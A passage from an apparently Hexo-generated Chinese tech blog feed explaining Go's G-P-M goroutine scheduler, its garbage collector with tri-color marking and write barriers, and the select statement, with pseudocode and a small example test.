<p><strong>上下文切换的代价是高昂的</strong>，因为在核心上交换线程会花费很多时间。上下文切换的延迟取决于不同的因素，大概在在 50 到 100 纳秒之间。考虑到硬件平均在每个核心上每纳秒执行 12 条指令，那么一次上下文切换可能会花费 600 到 1200 条指令的延迟时间。实际上，上下文切换占用了大量程序执行指令的时间。</p>
<p>如果存<strong>在跨核上下文切换</strong>（Cross-Core Context Switch），可能会导致 CPU 缓存失效（CPU 从缓存访问数据的成本大约 3 到 40 个时钟周期，从主存访问数据的成本大约 100 到 300 个时钟周期），这种场景的切换成本会更加昂贵。</p>
<h1 id="Golang-为并发而生"><a href="#Golang-为并发而生" class="headerlink" title="Golang 为并发而生"></a>Golang 为并发而生</h1><p>Golang 从 2009 年正式发布以来，依靠其极高运行速度和高效的开发效率，迅速占据市场份额。Golang 从语言级别支持并发，通过轻量级协程 Goroutine 来实现程序并发运行。</p>
<p><strong>Goroutine 非常轻量</strong>，主要体现在以下两个方面：</p>
<p><strong>上下文切换代价小</strong>： Goroutine 上下文切换只涉及到三个寄存器（PC / SP / DX）的值修改；而对比线程的上下文切换则需要涉及模式切换（从用户态切换到内核态）、以及 16 个寄存器、PC、SP…等寄存器的刷新；</p>
<p><strong>内存占用少</strong>：线程栈空间通常是 2M，Goroutine 栈空间最小 2K；</p>
<p>Golang 程序中可以轻松支持<strong>10w</strong> 级别的 Goroutine 运行，而线程数量达到 1k 时，内存占用就已经达到 2G。</p>
<h1 id="Go-调度器实现机制："><a href="#Go-调度器实现机制：" class="headerlink" title="Go 调度器实现机制："></a>Go 调度器实现机制：</h1><p>Go 程序通过调度器来调度Goroutine 在内核线程上执行，但是 G-Goroutine并不直接绑定 OS 线程 M - Machine运行，而是由 Goroutine Scheduler 中的 P - Processor （逻辑处理器）来作获取内核线程资源的『中介』。<br>Go 调度器模型我们通常叫做<strong>G-P-M 模型</strong>，他包括 4 个重要结构，分别是<strong>G、P、M、Sched</strong>：</p>
<p><strong>G:Goroutine</strong>，每个 Goroutine 对应一个 G 结构体，G 存储 Goroutine 的运行堆栈、状态以及任务函数，可重用。</p>
<p>G 并非执行体，每个 G 需要绑定到 P 才能被调度执行。</p>
<p><strong>P: Processor</strong>，表示逻辑处理器，对 G 来说，P 相当于 CPU 核，G 只有绑定到 P 才能被调度。对 M 来说，P 提供了相关的执行环境(Context)，如内存分配状态(mcache)，任务队列(G)等。</p>
<p>P 的数量决定了系统内最大可并行的 G 的数量（前提：物理 CPU 核数 &gt;= P 的数量）。</p>
<p><strong>P 的数量由用户设置的 GoMAXPROCS 决定，但是不论 GoMAXPROCS 设置为多大，P 的数量最大为 256</strong>。</p>
<p><strong>M: Machine</strong>，OS 内核线程抽象，代表着真正执行计算的资源，在绑定有效的 P 后，进入 schedule 循环；而 schedule 循环的机制大致是从 Global 队列、P 的 Local 队列以及 wait 队列中获取。</p>
<p><strong>M 的数量是不定的，由 Go Runtime 调整</strong>，为了防止创建过多 OS 线程导致系统调度不过来，目前默认最大限制为 10000 个。</p>
<p>M 并不保留 G 状态，这是 G 可以跨 M 调度的基础。</p>
<p><strong>Sched：Go 调度器</strong>，它维护有存储 M 和 G 的队列以及调度器的一些状态信息等。</p>
<p>调度器循环的机制大致是从各种队列、P 的本地队列中获取 G，切换到 G 的执行栈上并执行 G 的函数，调用 Goexit 做清理工作并回到 M，如此反复。</p>
<p><strong>理解 M、P、G 三者的关系，可以通过经典的地鼠推车搬砖的模型来说明其三者关系：</strong></p>
<p><img src="https://pic3.zhimg.com/80/v2-a27259141ff915578ab5165d75432930_1440w.jpg" alt="mpg"></p>
<p><strong>地鼠(Gopher)的工作任务是</strong>：工地上有若干砖头，地鼠借助小车把砖头运送到火种上去烧制。<strong>M 就可以看作图中的地鼠，P 就是小车，G 就是小车里装的砖</strong>。</p>
<p>弄清楚了它们三者的关系，下面我们就开始重点聊地鼠是如何在搬运砖块的。</p>
<p><strong>Processor（P）：</strong></p>
<p>根据用户设置的 **GoMAXPROCS **值来创建一批小车(P)。</p>
<p><strong>Goroutine(G)：</strong></p>
<p>通过 Go 关键字就是用来创建一个 Goroutine，也就相当于制造一块砖(G)，然后将这块砖(G)放入当前这辆小车(P)中。</p>
<p><strong>Machine (M)：</strong></p>
<p>地鼠(M)不能通过外部创建出来，只能砖(G)太多了，地鼠(M)又太少了，实在忙不过来，<strong>刚好还有空闲的小车(P)没有使用</strong>，那就从别处再借些地鼠(M)过来直到把小车(P)用完为止。</p>
<p>这里有一个地鼠(M)不够用，从别处借地鼠(M)的过程，这个过程就是创建一个内核线程(M)。</p>
<p><strong>需要注意的是</strong>：地鼠(M) 如果没有小车(P)是没办法运砖的，<strong>小车(P)的数量决定了能够干活的地鼠(M)数量</strong>，在 Go 程序里面对应的是活动线程数；</p>
<p><strong>在 Go 程序里我们通过下面的图示来展示 G-P-M 模型：</strong><br><img src="https://pic2.zhimg.com/80/v2-a39b9615c2a4dc7fc3a5af9ff93da828_1440w.jpg" alt="gpm"></p>
<p>P 代表可以“并行”运行的逻辑处理器，每个 P 都被分配到一个系统线程 M，G 代表 Go 协程。</p>
<p>Go 调度器中有两个不同的运行队列：**全局运行队列(GRQ)和本地运行队列(LRQ)**。</p>
<p>每个 P 都有一个 LRQ，用于管理分配给在 P 的上下文中执行的 Goroutines，这些 Goroutine 轮流被和 P 绑定的 M 进行上下文切换。GRQ 适用于尚未分配给 P 的 Goroutines。</p>
<p>从上图可以看出，G 的数量可以远远大于 M 的数量，换句话说，Go 程序可以利用少量的内核级线程来支撑大量 Goroutine 的并发。多个 Goroutine 通过用户级别的上下文切换来共享内核线程 M 的计算资源，但对于操作系统来说并没有线程上下文切换产生的性能损耗。</p>
<p><strong>为了更加充分利用线程的计算资源，Go 调度器采取了以下几种调度策略</strong>：</p>
<p><strong>任务窃取（work-stealing）</strong></p>
<p>我们知道，现实情况有的 Goroutine 运行的快，有的慢，那么势必肯定会带来的问题就是，忙的忙死，闲的闲死，Go 肯定不允许摸鱼的 P 存在，势必要充分利用好计算资源。</p>
<p>为了提高 Go 并行处理能力，调高整体处理效率，当每个 P 之间的 G 任务不均衡时，调度器允许从 GRQ，或者其他 P 的 LRQ 中获取 G 执行。</p>
<p><strong>减少阻塞</strong></p>
<p>如果正在执行的 Goroutine 阻塞了线程 M 怎么办？P 上 LRQ 中的 Goroutine 会获取不到调度么？</p>
<p><strong>在 Go 里面阻塞主要分为一下 4 种场景：</strong></p>
<p><strong>场景 1</strong>：由于原子、互斥量或通道操作调用导致 Goroutine 阻塞，调度器将把当前阻塞的 Goroutine 切换出去，重新调度 LRQ 上的其他 Goroutine；</p>
<p><strong>场景 2</strong>：由于网络请求和 IO 操作导致 Goroutine 阻塞，这种阻塞的情况下，我们的 G 和 M 又会怎么做呢？</p>
<p>Go 程序提供了网络轮询器（NetPoller）来处理网络请求和 IO 操作的问题，其后台通过 kqueue（MacOS），epoll（Linux）或 iocp（Windows）来实现 IO 多路复用。</p>
<p>通过使用 NetPoller 进行网络系统调用，调度器可以防止 Goroutine 在进行这些系统调用时阻塞 M。这可以让 M 执行 P 的 LRQ 中其他的 Goroutines，而不需要创建新的 M。有助于减少操作系统上的调度负载。</p>
<p>下图展示它的工作原理：G1 正在 M 上执行，还有 3 个 Goroutine 在 LRQ 上等待执行。网络轮询器空闲着，什么都没干。</p>
<p><img src="https://pic3.zhimg.com/80/v2-b89070ec76ea9aaf4a3b8107e8f1fe84_1440w.jpg" alt="场景2"><br>接下来，G1 想要进行网络系统调用，因此它被移动到网络轮询器并且处理异步网络系统调用。然后，M 可以从<br>LRQ 执行另外的 Goroutine。此时，G2 就被上下文切换到 M 上了。</p>
<p><img src="https://pic2.zhimg.com/80/v2-62455d37b17ddfe216aa596338cf5e2a_1440w.jpg" alt="g2m"><br>最后，异步网络系统调用由网络轮询器完成，G1 被移回到 P 的 LRQ 中。一旦 G1 可以在 M 上进行上下文切换，它负责的 Go 相关代码就可以再次执行。这里的最大优势是，执行网络系统调用不需要额外的 M。网络轮询器使用系统线程，它时刻处理一个有效的事件循环。<br><img src="https://pic3.zhimg.com/80/v2-c9237c70726b41ca722e0b4bf883b553_1440w.jpg" alt="lrqp"></p>
<p>这种调用方式看起来很复杂，值得庆幸的是，<strong>Go 语言将该“复杂性”隐藏在 Runtime 中</strong>：Go 开发者无需关注 socket 是否是 non-block 的，也无需亲自注册文件描述符的回调，只需在每个连接对应的 Goroutine 中以“block I/O”的方式对待 socket 处理即可，<strong>实现了 goroutine-per-connection 简单的网络编程模式</strong>（但是大量的 Goroutine 也会带来额外的问题，比如栈内存增加和调度器负担加重）。</p>
<p>用户层眼中看到的 Goroutine 中的“block socket”，实际上是通过 Go runtime 中的 netpoller 通过 Non-block socket +<br>I/O 多路复用机制“模拟”出来的。Go 中的 net 库正是按照这方式实现的。</p>
<p><strong>场景 3</strong>：当调用一些系统方法的时候，如果系统方法调用的时候发生阻塞，这种情况下，网络轮询器（NetPoller）无法使用，而进行系统调用的 Goroutine 将阻塞当前 M。</p>
<p>让我们来看看同步系统调用（如文件 I/O）会导致 M 阻塞的情况：G1 将进行同步系统调用以阻塞 M1。<br><img src="https://picb.zhimg.com/80/v2-bc3e58a8f34c24c0229a4add669a3e52_1440w.jpg" alt="3-1"></p>
<p>调度器介入后：识别出 G1 已导致 M1 阻塞，此时，调度器将 M1 与 P 分离，同时也将 G1 带走。然后调度器引入新的 M2 来服务 P。此时，可以从 LRQ 中选择 G2 并在 M2 上进行上下文切换。<br><img src="https://picb.zhimg.com/80/v2-9875a8b04b3653e0da8e0794dea7035e_1440w.jpg" alt="3-2"></p>
<p>阻塞的系统调用完成后：G1 可以移回 LRQ 并再次由 P 执行。如果这种情况再次发生，M1 将被放在旁边以备将来重复使用。<br><img src="https://picb.zhimg.com/80/v2-c0398b611bfcbe16309882a9a59c39d7_1440w.jpg" alt="3-3"></p>
<p><strong>场景 4</strong>：如果在 Goroutine 去执行一个 sleep 操作，导致 M 被阻塞了。</p>
<p>Go 程序后台有一个监控线程 sysmon，它监控那些长时间运行的 G 任务然后设置可以强占的标识符，别的 Goroutine 就可以抢先进来执行。</p>
<p>只要下次这个 Goroutine 进行函数调用，那么就会被强占，同时也会保护现场，然后重新放入 P 的本地队列里面等待下次执行。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文主要从 Go 调度器架构层面上介绍了 G-P-M 模型，通过该模型怎样实现少量内核线程支撑大量 Goroutine 的并发运行。以及通过 NetPoller、sysmon 等帮助 Go 程序减少线程阻塞，充分利用已有的计算资源，从而最大限度提高 Go 程序的运行效率。</p>
<p>参考文档：</p>
<p><a href="https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part1.html">https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part1.html</a></p>
<p><a href="https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part2.html">https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part2.html</a></p>
<p><a href="https://www.ardanlabs.com/blog/2018/12/scheduling-in-go-part3.html">https://www.ardanlabs.com/blog/2018/12/scheduling-in-go-part3.html</a></p>
<p><a href="https://segmentfault.com/a/1190000016038785">https://segmentfault.com/a/1190000016038785</a></p>
<p><a href="https://segmentfault.com/a/1190000016611742">https://segmentfault.com/a/1190000016611742</a></p>
<p><a href="https://segmentfault.com/a/1190000017333717">https://segmentfault.com/a/1190000017333717</a></p>
<p><a href="https://segmentfault.com/a/1190000015352983">https://segmentfault.com/a/1190000015352983</a></p>
<p><a href="https://segmentfault.com/a/1190000015464889">https://segmentfault.com/a/1190000015464889</a></p>
<p><a href="https://www.cnblogs.com/lxmhhy/p/6041001.html">https://www.cnblogs.com/lxmhhy/p/6041001.html</a></p>
<p><a href="https://www.cnblogs.com/mokafamily/p/9975980.html">https://www.cnblogs.com/mokafamily/p/9975980.html</a></p>
<p><a href="https://studygolang.com/articles/9211">https://studyGolang.com/articles/9211</a></p>
<p><a href="https://www.zhihu.com/question/20862617">https://www.zhihu.com/question/20862617</a></p>
<p><a href="https://codeburst.io/why-Goroutines-are-not-lightweight-threads-7c460c1f155f">https://codeburst.io/why-Goroutines-are-not-lightweight-threads-7c460c1f155f</a></p>
<p><a href="https://blog.csdn.net/tiandyoin/article/details/76556702">https://blog.csdn.net/tiandyoin/article/details/76556702</a></p>
<p><a href="https://www.jianshu.com/p/cc3c0fefee43">https://www.jianshu.com/p/cc3c0fefee43</a></p>
<p><a href="https://www.jianshu.com/p/a315224886d2">https://www.jianshu.com/p/a315224886d2</a></p>
<hr>
<p><strong>本文转自<a href="https://zhuanlan.zhihu.com/p/111346689">https://zhuanlan.zhihu.com/p/111346689</a></strong></p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>channel</tag>
      </tags>
  </entry>
  <entry>
    <title>golang垃圾回收</title>
    <url>/2020/08/27/golang_gc/</url>
    <content><![CDATA[<blockquote>
<p>垃圾回收(Garbage Collection，简称GC)是编程语言中提供的自动的内存管理机制。</p>
</blockquote>
<h1 id="GC背景"><a href="#GC背景" class="headerlink" title="GC背景"></a>GC背景</h1><p>C/C++等传统编程语言需要对内存手动释放，操作繁琐，处理不好容易内存泄露，尤其系统比较错综复杂情况下，释放内存可能会产生连锁问题。应对这个问题，后续出现的语言都引入了自动内存管理，<br>内存释放由虚拟机（virtual machine）或运行时（runtime）来自动进行管理。而这种对不再使用的内存资源进行自动回收的功能就被称为垃圾回收。</p>
<h1 id="常见垃圾回收机制"><a href="#常见垃圾回收机制" class="headerlink" title="常见垃圾回收机制"></a>常见垃圾回收机制</h1><h2 id="引用计数（reference-counting）"><a href="#引用计数（reference-counting）" class="headerlink" title="引用计数（reference counting）"></a>引用计数（reference counting）</h2><p>对每个对象维护一个引用计数，当引用该对象的对象被销毁时，引用计数减1，当引用计数器为0是回收该对象</p>
<p>优点：对象可以很快的被回收，不会出现内存耗尽或达到某个阀值时才回收。</p>
<p>缺点：不能很好的处理循环引用，而且需要额外的空间存放计数，频繁更新引用计数降低了性能。</p>
<p>代表语言：Python、PHP</p>
<h2 id="标记清除（mark-and-sweep）"><a href="#标记清除（mark-and-sweep）" class="headerlink" title="标记清除（mark and sweep）"></a>标记清除（mark and sweep）</h2><p>从根变量开始遍历所有引用的对象，引用的对象标记为”被引用”，没有被标记的进行回收。</p>
<p>优点：解决了引用计数的缺点。</p>
<p>缺点：需要STW（stop the world），即要暂时停掉程序运行，不能满足实时性要求较高系统</p>
<p>对于标记清除，有一种标记-压缩算法的衍生算法：</p>
<p>对于压缩阶段，它的工作就是移动所有的可达对象到堆内存的同一个区域中，使他们紧凑的排列在一起，从而将所有非可达对象释放出来的空闲内存都集中在一起，通过这样的方式来达到减少内存碎片的目的。</p>
<p>golang语言采用了另一种衍生算法三色标记，见下文详细介绍</p>
<p>代表语言：golang</p>
<h2 id="分代收集（generation）"><a href="#分代收集（generation）" class="headerlink" title="分代收集（generation）"></a>分代收集（generation）</h2><p>按照对象生命周期长短划分不同的代空间，生命周期长的放入老年代，而短的放入新生代，不同代有不同的回收算法和回收频率。</p>
<p>新创建的对象存放在称为 新生代（young generation）中（一般来说，新生代的大小会比 老年代小很多）。高频对新生成的对象进行回收，称为「小回收」，低频对所有对象回收，称为「大回收」。</p>
<p>每一次「小回收」过后，就把存活下来的对象归为老年代，「小回收」的时候，遇到老年代直接跳过。大多数分代回收算法都采用的「复制收集」方法，因为小回收中垃圾的比例较大。</p>
<p>优点：回收性能好</p>
<p>缺点：实现复杂，引入『写屏障』（Write Barrier）</p>
<p>代表语言：JAVA</p>
<h2 id="复制收集（Copying）"><a href="#复制收集（Copying）" class="headerlink" title="复制收集（Copying）"></a>复制收集（Copying）</h2><p>复制收集的方式只需要对对象进行一次扫描。准备一个「新的空间」，从根开始，对对象进行扫，如果存在对这个对象的引用，就把它复制到「新空间中」。一次扫描结束之后，所有存在于「新空间」的对象就是所有的非垃圾对象。</p>
<p>优点：只需臊面扫描一次，有『局部性』</p>
<p>收集过程中会按照对象被引用的顺序将对象复制到新空间中。关系较近的对象被放在距离较近的内存空间的可能性会提高，这叫做局部性。局部性高的情况下，内存缓存会更有效地运作，程序的性能会提高。</p>
<p>缺点：需要额外开辟一块用来复制的内存</p>
<p>代表语言： JAVA</p>
<h1 id="golang垃圾回收"><a href="#golang垃圾回收" class="headerlink" title="golang垃圾回收"></a>golang垃圾回收</h1><h2 id="演进过程"><a href="#演进过程" class="headerlink" title="演进过程"></a>演进过程</h2><p>go语言垃圾回收总体采用的是mark and sweep的衍生算法『三色标记』，演进过程如下</p>
<ul>
<li>1.3以前的版本使用标记-清扫的方式，整个过程都需要STW。</li>
<li>1.3版本分离了标记和清扫的操作，标记过程STW，清扫过程并发执行。</li>
<li>1.5版本在标记过程中使用三色标记法。回收过程主要有四个阶段，其中，标记和清扫都并发执行的，但标记阶段的前后需要STW一定时间来做GC的准备工作和栈的re-scan。</li>
</ul>
<h2 id="三色标记"><a href="#三色标记" class="headerlink" title="三色标记"></a>三色标记</h2><p>三色标记算法是对标记阶段的改进，解决STW时间过长，将程序中的对象分为黑、白、灰三种颜色</p>
<ul>
<li>白色对象 — 潜在的垃圾，其内存可能会被垃圾收集器回收；</li>
<li>黑色对象 — 活跃的对象，包括不存在任何引用外部指针的对象以及从根对象可达的对象；</li>
<li>灰色对象 — 活跃的对象，因为存在指向白色对象的外部指针，垃圾收集器会扫描这些对象的子对象；</li>
</ul>
<ol>
<li>起初所有对象都是白色。</li>
<li>从根出发扫描所有可达对象，标记为灰色，放入待处理队列。</li>
<li>从队列取出灰色对象，将其引用对象标记为灰色放入队列，自身标记为黑色。</li>
<li>重复3，直到灰色对象队列为空。此时白色对象即为垃圾，进行回收。</li>
</ol>
<p>操作流程如下图：</p>
<p><img src="https://image-static.segmentfault.com/273/244/2732449449-5c66324354fa8_articlex" alt="三色标记"></p>
<p>标记过程需的要STW，因为对象引用关系如果在标记阶段做了修改，会影响标记结果的正确性。但是STW的过程有明显的资源浪费，对所有的用户程序都有很大影响，如何能在保证对象不丢失的情况下合理的尽可能的提高GC效率，减少STW时间呢？</p>
<p>在Golang中使用并发的垃圾回收，也就是多个赋值器与回收器并发执行，与此同时，应用屏障技术来保证回收器的正确性</p>
<h2 id="屏障技术"><a href="#屏障技术" class="headerlink" title="屏障技术"></a>屏障技术</h2><p>想要在并发或者增量的标记算法中保证正确性，我们需要达成以下两种三色不变性（Tri-color invariant）中的任意一种：</p>
<p><strong>弱三色不变式</strong>：所有被黑色对象引用的白色对象都处于灰色保护状态（直接或间接从灰色对象可达）。 </p>
<p><strong>强三色不变式</strong>：不存在黑色对象到白色对象的指针。</p>
<p>垃圾收集中的屏障技术更像是一个钩子方法，它是在用户程序读取对象、创建新对象以及更新对象指针时执行的一段代码，根据操作类型的不同，我们可以将它们分成读屏障（Read barrier）和写屏障（Write barrier）两种，因为读屏障需要在读操作中加入代码片段，对用户程序的性能影响很大，所以编程语言往往都会采用写屏障保证三色不变性。</p>
<h3 id="插入屏障"><a href="#插入屏障" class="headerlink" title="插入屏障"></a>插入屏障</h3><p>插入屏障拦截将白色指针插入黑色对象的操作，标记其对应对象为灰色状态，这样就不存在黑色对象引用白色对象的情况了，满足强三色不变式，如上图例中，在插入指针f时将C对象标记为灰色。Go1.5版本使用的Dijkstra写屏障就是这个原理，伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">writePointer(slot, ptr):</span><br><span class="line">    shade(ptr)</span><br><span class="line">    *slot &#x3D; ptr</span><br></pre></td></tr></table></figure>

<p>在Golang中，对栈上指针的写入添加写屏障的成本很高，所以Go选择仅对堆上的指针插入增加写屏障，这样就会出现在扫描结束后，栈上仍存在引用白色对象的情况，这时的栈是灰色的，不满足三色不变式，所以需要对栈进行重新扫描使其变黑，完成剩余对象的标记，这个过程需要STW。这期间会将所有goroutine挂起，当有大量应用程序时，时间可能会达到10～100ms。</p>
<h3 id="删除屏障"><a href="#删除屏障" class="headerlink" title="删除屏障"></a>删除屏障</h3><p>删除屏障也是拦截写操作的，但是是通过保护灰色对象到白色对象的路径不会断来实现的。这种方式的回收精度低，一个对象即使被删除了最后一个指向它的指针也依旧可以活过这一轮，在下一轮GC中被清理掉。Yuasa屏障伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">writePointer(slot, ptr):</span><br><span class="line">    if (isGery(slot) || isWhite(slot))</span><br><span class="line">        shade(*slot)</span><br><span class="line">    *slot &#x3D; ptr</span><br></pre></td></tr></table></figure>
<p>在这种实现方式中，回收器悲观的认为所有被删除的对象都可能会被黑色对象引用。</p>
<h3 id="混合写屏障"><a href="#混合写屏障" class="headerlink" title="混合写屏障"></a>混合写屏障</h3><p>插入屏障和删除屏障各有优缺点，Dijkstra的插入写屏障在标记开始时无需STW，可直接开始，并发进行，但结束时需要STW来重新扫描栈，标记栈上引用的白色对象的存活；Yuasa的删除写屏障则需要在GC开始时STW扫描堆栈来记录初始快照，这个过程会保护开始时刻的所有存活对象，但结束时无需STW。Go1.8版本引入的混合写屏障结合了Yuasa的删除写屏障和Dijkstra的插入写屏障，结合了两者的优点，伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">writePointer(slot, ptr):</span><br><span class="line">    shade(*slot)</span><br><span class="line">    if current stack is grey:</span><br><span class="line">        shade(ptr)</span><br><span class="line">    *slot &#x3D; ptr</span><br></pre></td></tr></table></figure>

<p>这里使用了两个shade操作，shade(*slot)是删除写屏障的变形，例如，一个堆上的灰色对象B，引用白色对象C，在GC并发运行的过程中，如果栈已扫描置黑，而赋值器将指向C的唯一指针从B中删除，并让栈上其他对象引用它，这时，写屏障会在删除指向白色对象C的指针的时候就将C对象置灰，就可以保护下来了，且它下游的所有对象都处于被保护状态。 如果对象B在栈上，引用堆上的白色对象C，将其引用关系删除，且新增一个黑色对象到对象C的引用，那么就需要通过shade(ptr)来保护了，在指针插入黑色对象时会触发对对象C的置灰操作。如果栈已经被扫描过了，那么栈上引用的对象都是灰色或受灰色保护的白色对象了，所以就没有必要再进行这步操作。</p>
<p>Golang中的混合写屏障满足的是变形的弱三色不变式，同样允许黑色对象引用白色对象，白色对象处于灰色保护状态，但是只由堆上的灰色对象保护。由于结合了Yuasa的删除写屏障和Dijkstra的插入写屏障的优点，只需要在开始时并发扫描各个goroutine的栈，使其变黑并一直保持，这个过程不需要STW，而标记结束后，因为栈在扫描后始终是黑色的，也无需再进行re-scan操作了，减少了STW的时间。</p>
<h2 id="触发时机"><a href="#触发时机" class="headerlink" title="触发时机"></a>触发时机</h2><p>自动垃圾回收的触发条件有两个：</p>
<ol>
<li><p>超过内存大小阈值<br>阈值是由一个gcpercent的变量控制的,当新分配的内存占已在使用中的内存的比例超过gcprecent时就会触发。比如一次回收完毕后，内存的使用量为5M，那么下次回收的时机则是内存分配达到10M的时候。也就是说，并不是内存分配越多，垃圾回收频率越高。</p>
</li>
<li><p>达到定时时间<br>如果一直达不到内存大小的阈值呢？这个时候GC就会被定时时间触发，比如一直达不到10M，那就定时（默认2min触发一次）触发一次GC保证资源的回收。</p>
</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了常见垃圾回收算法，对golang GC的演进及三色标记做了详细介绍，屏障技术的使用使得golang可以并发回收垃圾。<br>但是GC不是万能的，最好还是养成手动回收内存的习惯：比如手动把不再使用的内存释放，把对象置成nil，也可以考虑在合适的时候调用runtime.GC()触发GC。</p>
<p>参考文章</p>
<p><a href="https://segmentfault.com/a/1190000004665100">https://segmentfault.com/a/1190000004665100</a><br><a href="https://segmentfault.com/a/1190000018161588">https://segmentfault.com/a/1190000018161588</a><br><a href="https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-garbage-collector/">https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-garbage-collector/</a><br><a href="https://studygolang.com/articles/25096">https://studygolang.com/articles/25096</a><br><a href="https://zhuanlan.zhihu.com/p/74853110">https://zhuanlan.zhihu.com/p/74853110</a><br><a href="https://juejin.im/post/6844903917650722829">https://juejin.im/post/6844903917650722829</a></p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>gc</tag>
      </tags>
  </entry>
  <entry>
    <title>golang select详解</title>
    <url>/2020/08/26/golang_select/</url>
    <content><![CDATA[<h1 id="官方定义"><a href="#官方定义" class="headerlink" title="官方定义"></a>官方定义</h1><blockquote>
<p>“select” statement chooses which of a set of possible send or receive operations will proceed. It looks similar to a “switch” statement but with the cases all referring to communication operations.</p>
</blockquote>
<blockquote>
<p>一个select语句用来选择哪个case中的发送或接收操作可以被立即执行。它类似于switch语句，但是它的case涉及到channel有关的I/O操作.</p>
</blockquote>
<h1 id="执行步骤"><a href="#执行步骤" class="headerlink" title="执行步骤"></a>执行步骤</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">For all the cases in the statement, the channel operands of receive operations and the channel and right-hand-side expressions of send statements are evaluated exactly once,</span><br><span class="line">in source order, upon entering the &quot;select&quot; statement. The result is a set of channels to receive from or send to, and the corresponding values to send. Any side effects in </span><br><span class="line">that evaluation will occur irrespective of which (if any) communication operation is selected to proceed. Expressions on the left-hand side of a RecvStmt with a short variable</span><br><span class="line"> declaration or assignment are not yet evaluated.</span><br></pre></td></tr></table></figure>

<p>所有channel表达式都会被求值、所有被发送的表达式都会被求值。求值顺序：自上而下、从左到右.<br>结果是选择一个发送或接收的channel，无论选择哪一个case进行操作，表达式都会被执行。RecvStmt左侧短变量声明或赋值未被评估。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If one or more of the communications can proceed, a single one that can proceed is chosen via a uniform pseudo-random selection.</span><br><span class="line">Otherwise, if there is a default case, that case is chosen. If there is no default case, the &quot;select&quot; statement blocks until at </span><br><span class="line">least one of the communications can proceed.</span><br></pre></td></tr></table></figure>

<p>如果有一个或多个IO操作可以完成，则Go运行时系统会随机的选择一个执行，否则的话，如果有default分支，则执行default分支语句，如果连default都没有，则select语句会一直阻塞，直到至少有一个IO操作可以进行.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unless the selected case is the default case, the respective communication operation is executed.</span><br></pre></td></tr></table></figure>
<p>除非所选择的情况是默认情况，否则执行相应的通信操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If the selected case is a RecvStmt with a short variable declaration or an assignment, the left-hand side expressions are evaluated</span><br><span class="line"> and the received value (or values) are assigned.</span><br></pre></td></tr></table></figure>

<p>如果所选case是具有短变量声明或赋值的RecvStmt，则评估左侧表达式并分配接收值（或多个值）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The statement list of the selected case is executed.</span><br></pre></td></tr></table></figure>

<p>执行所选case中的语句</p>
<h1 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ch1 <span class="keyword">chan</span> <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> ch2 <span class="keyword">chan</span> <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> chs = []<span class="keyword">chan</span> <span class="keyword">int</span>&#123;ch1, ch2&#125;</span><br><span class="line"><span class="keyword">var</span> numbers = []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestSelect</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> getChan(<span class="number">0</span>) &lt;- getNumber(<span class="number">2</span>):</span><br><span class="line"></span><br><span class="line">        fmt.Println(<span class="string">&quot;1th case is selected.&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> getChan(<span class="number">1</span>) &lt;- getNumber(<span class="number">3</span>):</span><br><span class="line"></span><br><span class="line">        fmt.Println(<span class="string">&quot;2th case is selected.&quot;</span>)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    </span><br><span class="line">    fmt.Println(<span class="string">&quot;default!.&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getNumber</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;numbers[%d]\n&quot;</span>, i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> numbers[i]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getChan</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">chan</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;chs[%d]\n&quot;</span>, i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> chs[i]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>执行结果</p>
<p>有default 无阻塞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D; RUN   TestSelect</span><br><span class="line">chs[0]</span><br><span class="line">numbers[2]</span><br><span class="line">chs[1]</span><br><span class="line">numbers[3]</span><br><span class="line">default!.</span><br><span class="line">--- PASS: TestSelect (0.00s)</span><br><span class="line">PASS</span><br></pre></td></tr></table></figure>

<p>无default 阻塞</p>
